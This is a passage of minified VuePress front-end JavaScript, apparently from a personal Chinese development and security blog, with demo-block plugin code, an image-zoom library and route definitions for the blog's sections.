1;\n}\n.vuepress-plugin-demo-block__wrapper .vuepress-plugin-demo-block__footer:hover .vuepress-plugin-demo-block__expand::before {\n  border-top-color: #3eaf7c !important;\n  border-bottom-color: #3eaf7c !important;\n}\n.vuepress-plugin-demo-block__wrapper .vuepress-plugin-demo-block__footer:hover svg {\n  fill: #3eaf7c !important;\n}\n.vuepress-plugin-demo-block__wrapper .vuepress-plugin-demo-block__footer .vuepress-plugin-demo-block__expand-text {\n  transition: all 0.5s;\n  opacity: 0;\n}\n.vuepress-plugin-demo-block__wrapper .vuepress-plugin-demo-block__footer form:nth-last-child(2) {\n  right: 50px;\n}\n.vuepress-plugin-demo-block__wrapper .vuepress-plugin-demo-block__footer form:last-child {\n  right: 10px;\n}\n.vuepress-plugin-demo-block__wrapper .vuepress-plugin-demo-block__footer .vuepress-plugin-demo-block__button {\n  border-color: transparent;\n  background-color: transparent;\n  font-size: 14px;\n  color: #3eaf7c;\n  cursor: pointer;\n  outline: none;\n  margin: 0;\n  width: 46px;\n  position: relative;\n}\n.vuepress-plugin-demo-block__wrapper .vuepress-plugin-demo-block__footer .vuepress-plugin-demo-block__button:hover::before {\n  content: attr(data-tip);\n  white-space: nowrap;\n  position: absolute;\n  top: -30px;\n  left: 50%;\n  color: #eee;\n  line-height: 1;\n  z-index: 1000;\n  border-radius: 4px;\n  padding: 6px;\n  -webkit-transform: translateX(-50%);\n          transform: translateX(-50%);\n  background-color: rgba(0, 0, 0, 0.8);\n}\n.vuepress-plugin-demo-block__wrapper .vuepress-plugin-demo-block__footer .vuepress-plugin-demo-block__button:hover::after {\n  content: '' !important;\n  display: block;\n  position: absolute;\n  left: 50%;\n  top: -5px;\n  -webkit-transform: translateX(-50%);\n          transform: translateX(-50%);\n  border: 5px solid transparent;\n  border-top-color: rgba(0, 0, 0, 0.8);\n}\n.vuepress-plugin-demo-block__wrapper .vuepress-plugin-demo-block__footer .vuepress-plugin-demo-block__button svg {\n  width: 34px;\n  height: 20px;\n  fill: #ccc;\n}\n.vuepress-plugin-demo-block__wrapper .vuepress-plugin-demo-block__footer .vuepress-plugin-demo-block__jsfiddle,\n.vuepress-plugin-demo-block__wrapper .vuepress-plugin-demo-block__footer .vuepress-plugin-demo-block__codepen {\n  position: absolute;\n  top: 10px;\n  transition: all 0.5s;\n}\n.vuepress-plugin-demo-block__wrapper .vuepress-plugin-demo-block__footer .vuepress-plugin-demo-block__expand {\n  position: relative;\n  width: 100px;\n  height: 40px;\n  margin: 0;\n  color: #3eaf7c;\n  font-size: 14px;\n  background-color: transparent;\n  border-color: transparent;\n  outline: none;\n  transition: all 0.5s;\n  cursor: pointer;\n}\n.vuepress-plugin-demo-block__wrapper .vuepress-plugin-demo-block__footer .vuepress-plugin-demo-block__expand::before {\n  content: \"\";\n  position: absolute;\n  top: 50%;\n  left: 50%;\n  width: 0;\n  height: 0;\n  border-top: 6px solid #ccc;\n  border-right: 6px solid transparent;\n  border-left: 6px solid transparent;\n  -webkit-transform: translate(-50%, -50%);\n          transform: translate(-50%, -50%);\n}\n");var Ts={jsLib:[],cssLib:[],jsfiddle:!0,codepen:!0,codepenLayout:"left",codepenJsProcessor:"babel",codepenEditors:"101",horizontal:!1,vue:"https://cdn.jsdelivr.net/npm/vue/dist/vue.min.js",react:"https://cdn.jsdelivr.net/npm/react/umd/react.production.min.js",reactDOM:"https://cdn.jsdelivr.net/npm/react-dom/umd/react-dom.production.min.js"},Es={},As=function(n){return'<div id="app">\n'.concat(n,"\n</div>")},zs=function(n){return window.$VUEPRESS_DEMO_BLOCK&&void 0!==window.$VUEPRESS_DEMO_BLOCK[n]?window.$VUEPRESS_DEMO_BLOCK[n]:Ts[n]},qs=function n(e,t,r){var a=document.createElement(e);return t&&Object.keys(t).forEach((function(n){if(n.indexOf("data"))a[n]=t[n];else{var e=n.replace("data","");a.dataset[e]=t[n]}})),r&&r.forEach((function(e){var t=e.tag,r=e.attrs,i=e.children;a.appendChild(n(t,r,i))})),a},Ms=function(n,e,t){var r,a=(r=n.querySelectorAll(".".concat(e)),Array.prototype.slice.call(r));return 1!==a.length||t?a:a[0]},Ps=function(n,e){var t,r,a=n.match(/<style>([\s\S]+)<\/style>/),i=n.match(/<template>([\s\S]+)<\/template>/),o=n.match(/<script>([\s\S]+)<\/script>/),s={css:a&&a[1].replace(/^\n|\n$/g,""),html:i&&i[1].replace(/^\n|\n$/g,""),js:o&&o[1].replace(/^\n|\n$/g,""),jsLib:e.jsLib||[],cssLib:e.cssLib||[]};s.htmlTpl=As(s.html),s.jsTpl=(t=s.js,r=t.replace(/export\s+default\s*?\{\n*/,"").replace(/\n*\}\s*$/,"").trim(),"new Vue({\n  el: '#app',\n  ".concat(r,"\n})")),s.script=function(n,e){var t=n.split(/export\s+default/),r="(function() {".concat(t[0]," ; return ").concat(t[1],"})()"),a=window.Babel?window.Babel.transform(r,{presets:["es2015"]}).code:r,i=[eval][0](a);return i.template=e,i}(s.js,s.html);var l=zs("vue");return s.jsLib.unshift(l),s},Ls=function(n,e){var t,r=n.match(/<style>([\s\S]+)<\/style>/),a=n.match(/<html>([\s\S]+)<\/html>/),i=n.match(/<script>([\s\S]+)<\/script>/),o={css:r&&r[1].replace(/^\n|\n$/g,""),html:a&&a[1].replace(/^\n|\n$/g,""),js:i&&i[1].replace(/^\n|\n$/g,""),jsLib:e.jsLib||[],cssLib:e.cssLib||[]};return o.htmlTpl=o.html,o.jsTpl=o.js,o.script=(t=o.js,window.Babel?window.Babel.transform(t,{presets:["es2015"]}).code:t),o},Rs=function(n){return n=n.replace("export default ","").replace(/App\.__style__(\s*)=(\s*)`([\s\S]*)?`/,""),n+='ReactDOM.render(React.createElement(App), document.getElementById("app"))'};function Os(){var n=Ms(document,"vuepress-plugin-demo-block__wrapper",!0);n.length?n.forEach((function(n){if("true"!==n.dataset.created){n.style.display="block";var e=Ms(n,"vuepress-plugin-demo-block__code"),t=Ms(n,"vuepress-plugin-demo-block__display"),r=Ms(n,"vuepress-plugin-demo-block__footer"),a=Ms(t,"vuepress-plugin-demo-block__app"),i=decodeURIComponent(n.dataset.code),o=decodeURIComponent(n.dataset.config),s=decodeURIComponent(n.dataset.type);o=o?JSON.parse(o):{};var l=e.querySelector("div").clientHeight,c="react"===s?function(n,e){var t=(0,window.Babel.transform)(n,{presets:["es2015","react"]}).code,r="(function(exports){var module={};module.exports=exports;".concat(t,";return module.exports.__esModule?module.exports.default:module.exports;})({})"),a=new Function("return ".concat(r))(),i={js:a,css:a.__style__||"",jsLib:e.jsLib||[],cssLib:e.cssLib||[],jsTpl:Rs(n),htmlTpl:As("")},o=zs("react"),s=zs("reactDOM");return i.jsLib.unshift(o,s),i}(i,o):"vanilla"===s?Ls(i,o):Ps(i,o),p=qs("button",{className:"".concat("vuepress-plugin-demo-block__expand")});if(r.appendChild(p),p.addEventListener("click",Ds.bind(null,p,l,e,r)),zs("jsfiddle")&&r.appendChild(function(n){var e=n.css,t=n.htmlTpl,r=n.jsTpl,a=n.jsLib,i=n.cssLib,o=a.concat(i).concat(zs("cssLib")).concat(zs("jsLib")).join(",");return qs("form",{className:"vuepress-plugin-demo-block__jsfiddle",target:"_blank",action:"https://jsfiddle.net/api/post/library/pure/",method:"post"},[{tag:"input",attrs:{type:"hidden",name:"css",value:e}},{tag:"input",attrs:{type:"hidden",name:"html",value:t}},{tag:"input",attrs:{type:"hidden",name:"js",value:r}},{tag:"input",attrs:{type:"hidden",name:"panel_js",value:3}},{tag:"input",attrs:{type:"hidden",name:"wrap",value:1}},{tag:"input",attrs:{type:"hidden",name:"resources",value:o}},{tag:"button",attrs:{type:"submit",className:"vuepress-plugin-demo-block__button",innerHTML:'<?xml version="1.0" standalone="no"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg t="1547088289967" class="icon" style="" viewBox="0 0 1170 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="1952" xmlns:xlink="http://www.w3.org/1999/xlink" width="228.515625" height="200"><defs><style type="text/css"></style></defs><path d="M1028.571429 441.142857q63.428571 26.285714 102.571428 83.142857T1170.285714 650.857143q0 93.714286-67.428571 160.285714T940 877.714286q-2.285714 0-6.571429-0.285715t-6-0.285714H232q-97.142857-5.714286-164.571429-71.714286T0 645.142857q0-62.857143 31.428571-116t84-84q-6.857143-22.285714-6.857142-46.857143 0-65.714286 46.857142-112t113.714286-46.285714q54.285714 0 98.285714 33.142857 42.857143-88 127.142858-141.714286t186.571428-53.714285q94.857143 0 174.857143 46T982.571429 248.571429t46.571428 172q0 3.428571-0.285714 10.285714t-0.285714 10.285714zM267.428571 593.142857q0 69.714286 48 110.285714t118.857143 40.571429q78.285714 0 137.142857-56.571429-9.142857-11.428571-27.142857-32.285714T519.428571 626.285714q-38.285714 37.142857-82.285714 37.142857-31.428571 0-53.428571-19.142857T361.714286 594.285714q0-30.285714 22-49.714285t52.285714-19.428572q25.142857 0 48.285714 12t41.714286 31.428572 37.142857 42.857142 39.428572 46.857143 44 42.857143 55.428571 31.428572 69.428571 12q69.142857 0 116.857143-40.857143T936 594.857143q0-69.142857-48-109.714286t-118.285714-40.571428q-81.714286 0-137.714286 55.428571l53.142857 61.714286q37.714286-36.571429 81.142857-36.571429 29.714286 0 52.571429 18.857143t22.857143 48q0 32.571429-21.142857 52.285714t-53.714286 19.714286q-24.571429 0-47.142857-12t-41.142857-31.428571-37.428572-42.857143-39.714286-46.857143-44.285714-42.857143-55.142857-31.428571T434.285714 444.571429q-69.714286 0-118.285714 40.285714T267.428571 593.142857z" p-id="1953"></path></svg>',datatip:"JSFiddle"}}])}(c)),zs("codepen")&&r.appendChild(function(n){var e=n.css,t=n.htmlTpl,r=n.jsTpl,a=n.jsLib,i=n.cssLib,o=JSON.stringify({css:e,html:t,js:r,js_external:a.concat(zs("jsLib")).join(";"),css_external:i.concat(zs("cssLib")).join(";"),layout:zs("codepenLayout"),js_pre_processor:zs("codepenJsProcessor"),editors:zs("codepenEditors")});return qs("form",{className:"vuepress-plugin-demo-block__codepen",target:"_blank",action:"https://codepen.io/pen/define",method:"post"},[{tag:"input",attrs:{type:"hidden",name:"data",value:o}},{tag:"button",attrs:{type:"submit",innerHTML:'<?xml version="1.0" standalone="no"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg t="1547088271207" class="icon" style="" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="1737" xmlns:xlink="http://www.w3.org/1999/xlink" width="200" height="200"><defs><style type="text/css"></style></defs><path d="M123.428571 668l344.571429 229.714286v-205.142857L277.142857 565.142857z m-35.428571-82.285714l110.285714-73.714286-110.285714-73.714286v147.428572z m468 312l344.571429-229.714286-153.714286-102.857143-190.857143 127.428572v205.142857z m-44-281.714286l155.428571-104-155.428571-104-155.428571 104zM277.142857 458.857143l190.857143-127.428572V126.285714L123.428571 356z m548.571429 53.142857l110.285714 73.714286V438.285714z m-78.857143-53.142857l153.714286-102.857143-344.571429-229.714286v205.142857z m277.142857-102.857143v312q0 23.428571-19.428571 36.571429l-468 312q-12 7.428571-24.571429 7.428571t-24.571429-7.428571L19.428571 704.571429q-19.428571-13.142857-19.428571-36.571429V356q0-23.428571 19.428571-36.571429L487.428571 7.428571q12-7.428571 24.571429-7.428571t24.571429 7.428571l468 312q19.428571 13.142857 19.428571 36.571429z" p-id="1738"></path></svg>',className:"vuepress-plugin-demo-block__button",datatip:"Codepen"}}])}(c)),void 0!==o.horizontal?o.horizontal:zs("horizontal")){n.classList.add("vuepress-plugin-demo-block__horizontal");var d=e.firstChild.cloneNode(!0);d.classList.add("vuepress-plugin-demo-block__h_code"),t.appendChild(d)}if(c.css&&function(n){if(!Es[n]){var e=qs("style",{innerHTML:n});document.body.appendChild(e),Es[n]=!0}}(c.css),"react"===s)ReactDOM.render(React.createElement(c.js),a);else if("vue"===s){var m=(new(Vue.extend(c.script))).$mount();a.appendChild(m.$el)}else"vanilla"===s&&(a.innerHTML=c.html,new Function("return (function(){".concat(c.script,"})()"))());n.dataset.created="true"}})):setTimeout((function(n){Os()}),300)}function Ds(n,e,t,r){var a="1"!==n.dataset.isExpand;t.style.height=a?"".concat(e,"px"):0,a?r.classList.add("vuepress-plugin-demo-block__show-link"):r.classList.remove("vuepress-plugin-demo-block__show-link"),n.dataset.isExpand=a?"1":"0"}var Bs={mounted:function(){window.$VUEPRESS_DEMO_BLOCK={jsfiddle:!1,codepen:!0,horizontal:!1},Os()},updated:function(){Os()}},Us="auto",Fs="zoom-in",Ns="zoom-out",Hs="grab",$s="move";function Vs(n,e,t){var r=!(arguments.length>3&&void 0!==arguments[3])||arguments[3],a={passive:!1};r?n.addEventListener(e,t,a):n.removeEventListener(e,t,a)}function Gs(n,e){if(n){var t=new Image;t.onload=function(){e&&e(t)},t.src=n}}function Ws(n){return n.dataset.original?n.dataset.original:"A"===n.parentNode.tagName?n.parentNode.getAttribute("href"):null}function Js(n,e,t){!function(n){var e=Qs,t=Xs;if(n.transition){var r=n.transition;delete n.transition,n[e]=r}if(n.transform){var a=n.transform;delete n.transform,n[t]=a}}(e);var r=n.style,a={};for(var i in e)t&&(a[i]=r[i]||""),r[i]=e[i];return a}var Qs="transition",Xs="transform",Ys="transform",Zs="transitionend";var Ks=function(){},nl={enableGrab:!0,preloadImage:!1,closeOnWindowResize:!0,transitionDuration:.4,transitionTimingFunction:"cubic-bezier(0.4, 0, 0, 1)",bgColor:"rgb(255, 255, 255)",bgOpacity:1,scaleBase:1,scaleExtra:.5,scrollThreshold:40,zIndex:998,customSize:null,onOpen:Ks,onClose:Ks,onGrab:Ks,onMove:Ks,onRelease:Ks,onBeforeOpen:Ks,onBeforeClose:Ks,onBeforeGrab:Ks,onBeforeRelease:Ks,onImageLoading:Ks,onImageLoaded:Ks},el={init:function(n){var e,t;e=this,t=n,Object.getOwnPropertyNames(Object.getPrototypeOf(e)).forEach((function(n){e[n]=e[n].bind(t)}))},click:function(n){if(n.preventDefault(),rl(n))return window.open(this.target.srcOriginal||n.currentTarget.src,"_blank");this.shown?this.released?this.close():this.release():this.open(n.currentTarget)},scroll:function(){var n=document.documentElement||document.body.parentNode||document.body,e=window.pageXOffset||n.scrollLeft,t=window.pageYOffset||n.scrollTop;null===this.lastScrollPosition&&(this.lastScrollPosition={x:e,y:t});var r=this.lastScrollPosition.x-e,a=this.lastScrollPosition.y-t,i=this.options.scrollThreshold;(Math.abs(a)>=i||Math.abs(r)>=i)&&(this.lastScrollPosition=null,this.close())},keydown:function(n){(function(n){return"Escape"===(n.key||n.code)||27===n.keyCode})(n)&&(this.released?this.close():this.release(this.close))},mousedown:function(n){if(tl(n)&&!rl(n)){n.preventDefault();var e=n.clientX,t=n.clientY;this.pressTimer=setTimeout(function(){this.grab(e,t)}.bind(this),200)}},mousemove:function(n){this.released||this.move(n.clientX,n.clientY)},mouseup:function(n){tl(n)&&!rl(n)&&(clearTimeout(this.pressTimer),this.released?this.close():this.release())},touchstart:function(n){n.preventDefault();var e=n.touches[0],t=e.clientX,r=e.clientY;this.pressTimer=setTimeout(function(){this.grab(t,r)}.bind(this),200)},touchmove:function(n){if(!this.released){var e=n.touches[0],t=e.clientX,r=e.clientY;this.move(t,r)}},touchend:function(n){(function(n){n.targetTouches.length})(n)||(clearTimeout(this.pressTimer),this.released?this.close():this.release())},clickOverlay:function(){this.close()},resizeWindow:function(){this.close()}};function tl(n){return 0===n.button}function rl(n){return n.metaKey||n.ctrlKey}var al={init:function(n){this.el=document.createElement("div"),this.instance=n,this.parent=document.body,Js(this.el,{position:"fixed",top:0,left:0,right:0,bottom:0,opacity:0}),this.updateStyle(n.options),Vs(this.el,"click",n.handler.clickOverlay.bind(n))},updateStyle:function(n){Js(this.el,{zIndex:n.zIndex,backgroundColor:n.bgColor,transition:"opacity\n        "+n.transitionDuration+"s\n        "+n.transitionTimingFunction})},insert:function(){this.parent.appendChild(this.el)},remove:function(){this.parent.removeChild(this.el)},fadeIn:function(){this.el.offsetWidth,this.el.style.opacity=this.instance.options.bgOpacity},fadeOut:function(){this.el.style.opacity=0}},il="function"==typeof Symbol&&"symbol"==typeof Symbol.iterator?function(n){return typeof n}:function(n){return n&&"function"==typeof Symbol&&n.constructor===Symbol&&n!==Symbol.prototype?"symbol":typeof n},ol=function(){function n(n,e){for(var t=0;t<e.length;t++){var r=e[t];r.enumerable=r.enumerable||!1,r.configurable=!0,"value"in r&&(r.writable=!0),Object.defineProperty(n,r.key,r)}}return function(e,t,r){return t&&n(e.prototype,t),r&&n(e,r),e}}(),sl=Object.assign||function(n){for(var e=1;e<arguments.length;e++){var t=arguments[e];for(var r in t)Object.prototype.hasOwnProperty.call(t,r)&&(n[r]=t[r])}return n},ll={init:function(n,e){this.el=n,this.instance=e,this.srcThumbnail=this.el.getAttribute("src"),this.srcset=this.el.getAttribute("srcset"),this.srcOriginal=Ws(this.el),this.rect=this.el.getBoundingClientRect(),this.translate=null,this.scale=null,this.styleOpen=null,this.styleClose=null},zoomIn:function(){var n=this.instance.options,e=n.zIndex,t=n.enableGrab,r=n.transitionDuration,a=n.transitionTimingFunction;this.translate=this.calculateTranslate(),this.scale=this.calculateScale(),this.styleOpen={position:"relative",zIndex:e+1,cursor:t?Hs:Ns,transition:Ys+"\n        "+r+"s\n        "+a,transform:"translate3d("+this.translate.x+"px, "+this.translate.y+"px, 0px)\n        scale("+this.scale.x+","+this.scale.y+")",height:this.rect.height+"px",width:this.rect.width+"px"},this.el.offsetWidth,this.styleClose=Js(this.el,this.styleOpen,!0)},zoomOut:function(){this.el.offsetWidth,Js(this.el,{transform:"none"})},grab:function(n,e,t){var r=cl(),a=r.x-n,i=r.y-e;Js(this.el,{cursor:$s,transform:"translate3d(\n        "+(this.translate.x+a)+"px, "+(this.translate.y+i)+"px, 0px)\n        scale("+(this.scale.x+t)+","+(this.scale.y+t)+")"})},move:function(n,e,t){var r=cl(),a=r.x-n,i=r.y-e;Js(this.el,{transition:Ys,transform:"translate3d(\n        "+(this.translate.x+a)+"px, "+(this.translate.y+i)+"px, 0px)\n        scale("+(this.scale.x+t)+","+(this.scale.y+t)+")"})},restoreCloseStyle:function(){Js(this.el,this.styleClose)},restoreOpenStyle:function(){Js(this.el,this.styleOpen)},upgradeSource:function(){if(this.srcOriginal){var n=this.el.parentNode;this.srcset&&this.el.removeAttribute("srcset");var e=this.el.cloneNode(!1);e.setAttribute("src",this.srcOriginal),e.style.position="fixed",e.style.visibility="hidden",n.appendChild(e),setTimeout(function(){this.el.setAttribute("src",this.srcOriginal),n.removeChild(e)}.bind(this),50)}},downgradeSource:function(){this.srcOriginal&&(this.srcset&&this.el.setAttribute("srcset",this.srcset),this.el.setAttribute("src",this.srcThumbnail))},calculateTranslate:function(){var n=cl(),e=this.rect.left+this.rect.width/2,t=this.rect.top+this.rect.height/2;return{x:n.x-e,y:n.y-t}},calculateScale:function(){var n=this.el.dataset,e=n.zoomingHeight,t=n.zoomingWidth,r=this.instance.options,a=r.customSize,i=r.scaleBase;if(!a&&e&&t)return{x:t/this.rect.width,y:e/this.rect.height};if(a&&"object"===(void 0===a?"undefined":il(a)))return{x:a.width/this.rect.width,y:a.height/this.rect.height};var o=this.rect.width/2,s=this.rect.height/2,l=cl(),c={x:l.x-o,y:l.y-s},p=c.x/o,d=c.y/s,m=i+Math.min(p,d);if(a&&"string"==typeof a){var u=t||this.el.naturalWidth,g=e||this.el.naturalHeight,h=parseFloat(a)*u/(100*this.rect.width),f=parseFloat(a)*g/(100*this.rect.height);if(m>h||m>f)return{x:h,y:f}}return{x:m,y:m}}};function cl(){var n=document.documentElement;return{x:Math.min(n.clientWidth,window.innerWidth)/2,y:Math.min(n.clientHeight,window.innerHeight)/2}}function pl(n,e,t){["mousedown","mousemove","mouseup","touchstart","touchmove","touchend"].forEach((function(r){Vs(n,r,e[r],t)}))}var dl=function(){function n(e){!function(n,e){if(!(n instanceof e))throw new TypeError("Cannot call a class as a function")}(this,n),this.target=Object.create(ll),this.overlay=Object.create(al),this.handler=Object.create(el),this.body=document.body,this.shown=!1,this.lock=!1,this.released=!0,this.lastScrollPosition=null,this.pressTimer=null,this.options=sl({},nl,e),this.overlay.init(this),this.handler.init(this)}return ol(n,[{key:"listen",value:function(n){if("string"==typeof n)for(var e=document.querySelectorAll(n),t=e.length;t--;)this.listen(e[t]);else"IMG"===n.tagName&&(n.style.cursor=Fs,Vs(n,"click",this.handler.click),this.options.preloadImage&&Gs(Ws(n)));return this}},{key:"config",value:function(n){return n?(sl(this.options,n),this.overlay.updateStyle(this.options),this):this.options}},{key:"open",value:function(n){var e=this,t=arguments.length>1&&void 0!==arguments[1]?arguments[1]:this.options.onOpen;if(!this.shown&&!this.lock){var r="string"==typeof n?document.querySelector(n):n;if("IMG"===r.tagName){if(this.options.onBeforeOpen(r),this.target.init(r,this),!this.options.preloadImage){var a=this.target.srcOriginal;null!=a&&(this.options.onImageLoading(r),Gs(a,this.options.onImageLoaded))}this.shown=!0,this.lock=!0,this.target.zoomIn(),this.overlay.insert(),this.overlay.fadeIn(),Vs(document,"scroll",this.handler.scroll),Vs(document,"keydown",this.handler.keydown),this.options.closeOnWindowResize&&Vs(window,"resize",this.handler.resizeWindow);var i=function n(){Vs(r,Zs,n,!1),e.lock=!1,e.target.upgradeSource(),e.options.enableGrab&&pl(document,e.handler,!0),t(r)};return Vs(r,Zs,i),this}}}},{key:"close",value:function(){var n=this,e=arguments.length>0&&void 0!==arguments[0]?arguments[0]:this.options.onClose;if(this.shown&&!this.lock){var t=this.target.el;this.options.onBeforeClose(t),this.lock=!0,this.body.style.cursor=Us,this.overlay.fadeOut(),this.target.zoomOut(),Vs(document,"scroll",this.handler.scroll,!1),Vs(document,"keydown",this.handler.keydown,!1),this.options.closeOnWindowResize&&Vs(window,"resize",this.handler.resizeWindow,!1);var r=function r(){Vs(t,Zs,r,!1),n.shown=!1,n.lock=!1,n.target.downgradeSource(),n.options.enableGrab&&pl(document,n.handler,!1),n.target.restoreCloseStyle(),n.overlay.remove(),e(t)};return Vs(t,Zs,r),this}}},{key:"grab",value:function(n,e){var t=arguments.length>2&&void 0!==arguments[2]?arguments[2]:this.options.scaleExtra,r=arguments.length>3&&void 0!==arguments[3]?arguments[3]:this.options.onGrab;if(this.shown&&!this.lock){var a=this.target.el;this.options.onBeforeGrab(a),this.released=!1,this.target.grab(n,e,t);var i=function n(){Vs(a,Zs,n,!1),r(a)};return Vs(a,Zs,i),this}}},{key:"move",value:function(n,e){var t=arguments.length>2&&void 0!==arguments[2]?arguments[2]:this.options.scaleExtra,r=arguments.length>3&&void 0!==arguments[3]?arguments[3]:this.options.onMove;if(this.shown&&!this.lock){this.released=!1,this.body.style.cursor=$s,this.target.move(n,e,t);var a=this.target.el,i=function n(){Vs(a,Zs,n,!1),r(a)};return Vs(a,Zs,i),this}}},{key:"release",value:function(){var n=this,e=arguments.length>0&&void 0!==arguments[0]?arguments[0]:this.options.onRelease;if(this.shown&&!this.lock){var t=this.target.el;this.options.onBeforeRelease(t),this.lock=!0,this.body.style.cursor=Us,this.target.restoreOpenStyle();var r=function r(){Vs(t,Zs,r,!1),n.lock=!1,n.released=!0,e(t)};return Vs(t,Zs,r),this}}}]),n}();const ml=JSON.parse('{"bgColor":"rgba(0,0,0,0.6)"}'),ul=Number("500");class gl{constructor(){this.instance=new dl(ml)}update(n=".theme-vdoing-content img:not(.no-zoom)"){"undefined"!=typeof window&&this.instance.listen(n)}updateDelay(n=".theme-vdoing-content img:not(.no-zoom)",e=ul){setTimeout(()=>this.update(n),e)}}var hl=[fs,ks,js,Is,Bs,{watch:{"$page.path"(){void 0!==this.$vuepress.zooming&&this.$vuepress.zooming.updateDelay()}},mounted(){this.$vuepress.zooming=new gl,this.$vuepress.zooming.updateDelay()}}],fl={name:"GlobalLayout",computed:{layout(){const n=this.getLayout();return ds("layout",n),Gt.component(n)}},methods:{getLayout(){if(this.$page.path){const n=this.$page.frontmatter.layout;return n&&(this.$vuepress.getLayoutAsyncComponent(n)||this.$vuepress.getVueComponent(n))?n:"Layout"}return"NotFound"}}},bl=t(0),vl=Object(bl.a)(fl,(function(){return(0,this._self._c)(this.layout,{tag:"component"})}),[],!1,null,null,null).exports;!function(n,e,t){switch(e){case"components":n[e]||(n[e]={}),Object.assign(n[e],t);break;case"mixins":n[e]||(n[e]=[]),n[e].push(...t);break;default:throw new Error("Unknown option name.")}}(vl,"mixins",hl);const yl=[{name:"v-f6da7732",path:"/dev/",component:vl,beforeEnter:(n,e,t)=>{ps("Layout","v-f6da7732").then(t)}},{path:"/dev/index.html",redirect:"/dev/"},{path:"/00.目录页/00.导航栏/01.开发.html",redirect:"/dev/"},{name:"v-4b18908b",path:"/sec/",component:vl,beforeEnter:(n,e,t)=>{ps("Layout","v-4b18908b").then(t)}},{path:"/sec/index.html",redirect:"/sec/"},{path:"/00.目录页/00.导航栏/02.安全.html",redirect:"/sec/"},{name:"v-3acc97ec",path:"/life/",component:vl,beforeEnter:(n,e,t)=>{ps("Layout","v-3acc97ec").then(t)}},{path:"/life/index.html",redirect:"/life/"},{path:"/00.目录页/00.导航栏/03.生活.html",redirect:"/life/"},{name:"v-572c22a4",path:"/more/",component:vl,beforeEnter:(n,e,t)=>{ps("Layout","v-572c22a4").then(t)}},{path:"/more/index.html",redirect:"/more/"},{path:"/00.目录页/00.导航栏/04.更多.html",redirect:"/more/"},{name:"v-c09a6976",path:"/dev/web/",component:vl,beforeEnter:(n,e,t)=>{ps("Layout","v-c09a6976").then(t)}},{path:"/dev/web/index.html",redirect:"/dev/web/"},{path:"/00.目录页/01.开发/00.前端.html",redirect:"/dev/web/"},{name:"v-667b11b3",path:"/dev/java/",component:vl,beforeEnter:(n,e,t)=>{ps("Layout","v-667b11b3").then(t)}},{path:"/dev/java/index.html",redirect:"/dev/java/"},{path:"/00.目录页/01.开发/01.后端.html",redirect:"/dev/java/"},{name:"v-637ee5a8",path:"/dev/basic/",component:vl,beforeEnter:(n,e,t)=>{ps("Layout","v-637ee5a8").then(t)}},{path:"/dev/basic/index.html",redirect:"/dev/basic/"},{path:"/00.目录页/01.开发/02.计算机基础.html",redirect:"/dev/basic/"},{name:"v-20ccf4ba",path:"/sec/sa/",component:vl,beforeEnter:(n,e,t)=>{ps("Layout","v-20ccf4ba").then(t)}},{path:"/sec/sa/index.html",redirect:"/sec/sa/"},{path:"/00.目录页/02.安全/00.静态分析.html",redirect:"/sec/sa/"},{name:"v-0767abfc",path:"/sec/vuln/",component:vl,beforeEnter:(n,e,t)=>{ps("Layout","v-0767abfc").then(t)}},{path:"/sec/vuln/index.html",redirect:"/sec/vuln/"},{path:"/00.目录页/02.安全/01.漏洞原理.html",redirect:"/sec/vuln/"},{name:"v-284a5c70",path:"/sec/dev/",component:vl,beforeEnter:(n,e,t)=>{ps("Layout","v-284a5c70").then(t)}},{path:"/sec/dev/index.html",redirect:"/sec/dev/"},{path:"/00.目录页/02.安全/02.安全开发.html",redirect:"/sec/dev/"},{name:"v-f5009938",path:"/sec/skill/",component:vl,beforeEnter:(n,e,t)=>{ps("Layout","v-f5009938").then(t)}},{path:"/sec/skill/index.html",redirect:"/sec/skill/"},{path:"/00.目录页/02.安全/03.奇淫巧技.html",redirect:"/sec/skill/"},{name:"v-9567367a",path:"/more/blog/",component:vl,beforeEnter:(n,e,t)=>{ps("Layout","v-9567367a").then(t)}},{path:"/more/blog/index.html",redirect:"/more/blog/"},{path:"/00.目录页/04.更多/00.博客搭建.html",redirect:"/more/blog/"},{name:"v-236f9bdc",path:"/dev/web/basis/htmlandcss/",component:vl,beforeEnter:(n,e,t)=>{ps("Layout","v-236f9bdc").then(t)}},{path:"/dev/web/basis/htmlandcss/index.html",redirect:"/dev/web/basis/htmlandcss/"},{path:"/01.开发/100.前端/1000.前端基础/00. HTML&CSS基础.html",redirect:"/dev/web/basis/htmlandcss/"},{name:"v-1068c768",path:"/dev/java/core/spring5/",component:vl,beforeEnter:(n,e,t)=>{ps("Layout","v-1068c768").then(t)}},{path:"/dev/java/core/spring5/index.html",redirect:"/dev/java/core/spring5/"},{path:"/01.开发/101.后端/1011.微服务核心/00.Spring5.html",redirect:"/dev/java/core/spring5/"},{name:"v-3ddfa200",path:"/dev/java/core/springmvc/",component:vl,beforeEnter:(n,e,t)=>{ps("Layout","v-3ddfa200").then(t)}},{path:"/dev/java/core/springmvc/index.html",redirect:"/dev/java/core/springmvc/"},{path:"/01.开发/101.后端/1011.微服务核心/01.SpringMVC.html",redirect:"/dev/java/core/springmvc/"},{name:"v-18fb999c",path:"/dev/java/core/mybatis/",component:vl,beforeEnter:(n,e,t)=>{ps("Layout","v-18fb999c").then(t)}},{path:"/dev/java/core/mybatis/index.html",redirect:"/dev/java/core/mybatis/"},{path:"/01.开发/101.后端/1011.微服务核心/02.Mybatis.html",redirect:"/dev/java/core/mybatis/"},{name:"v-68562108",path:"/dev/java/core/mybatisplus/",component:vl,beforeEnter:(n,e,t)=>{ps("Layout","v-68562108").then(t)}},{path:"/dev/java/core/mybatisplus/index.html",redirect:"/dev/java/core/mybatisplus/"},{path:"/01.开发/101.后端/1011.微服务核心/03.MyBatisPlus.html",redirect:"/dev/java/core/mybatisplus/"},{name:"v-7af8708c",path:"/dev/java/core/ssm/",component:vl,beforeEnter:(n,e,t)=>{ps("Layout","v-7af8708c").then(t)}},{path:"/dev/java/core/ssm/index.html",redirect:"/dev/java/core/ssm/"},{path:"/01.开发/101.后端/1011.微服务核心/04.SSM.html",redirect:"/dev/java/core/ssm/"},{name:"v-1a3c5af6",path:"/dev/java/core/